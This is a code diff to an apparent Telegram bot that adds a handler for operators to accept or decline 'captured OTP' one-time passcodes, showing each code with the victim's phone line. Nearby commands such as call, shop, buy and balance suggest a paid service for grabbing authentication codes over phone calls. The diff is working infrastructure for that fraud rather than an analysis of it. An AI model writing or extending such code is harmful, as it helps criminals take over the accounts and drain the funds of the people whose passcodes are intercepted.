@@ -14316,6 +14316,45 @@ async def call_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await status_msg.edit_text(msg, parse_mode=ParseMode.HTML)
 
 
+async def otp_action_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """
+    Handles ✅ Accept OTP / ❌ Decline OTP button presses from captured OTP messages.
+    callback_data format: otp_accept_<digits> or otp_decline_<digits>
+    """
+    query = update.callback_query
+    await query.answer()
+
+    parts = query.data.split("_", 2)
+    if len(parts) < 3:
+        await query.edit_message_text("❌ Invalid callback data.")
+        return
+
+    action = parts[1]
+    otp    = parts[2]
+
+    if action == "accept":
+        phone_line = ""
+        if query.message and query.message.text:
+            for line in query.message.text.splitlines():
+                if "Phone:" in line or "📞" in line:
+                    phone_line = line.strip()
+                    break
+        await query.edit_message_text(
+            f"✅ <b>OTP Accepted</b>\n\n"
+            f"🔑 Code: <b><code>{otp}</code></b>\n"
+            f"{phone_line}\n\n"
+            f"<i>Marked as accepted by operator.</i>",
+            parse_mode=ParseMode.HTML,
+        )
+    elif action == "decline":
+        await query.edit_message_text(
+            f"❌ <b>OTP Declined</b>\n\n"
+            f"🔑 Code: <code>{otp}</code>\n\n"
+            f"<i>Marked as rejected by operator.</i>",
+            parse_mode=ParseMode.HTML,
+        )
+
+
 async def addbalance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if not is_owner(user_id):
@@ -14749,6 +14788,7 @@ def main():
     application.add_handler(CommandHandler("shop", shop_command))
     application.add_handler(CommandHandler("checkout", checkout_command))
     application.add_handler(CommandHandler("call", call_command))
+    application.add_handler(CallbackQueryHandler(otp_action_callback, pattern="^otp_(accept|decline)_"))
     application.add_handler(CommandHandler("shopbuy", shopbuy_command))
     application.add_handler(CommandHandler("buy", shopbuy_command))
     application.add_handler(CommandHandler("balance", balance_command))
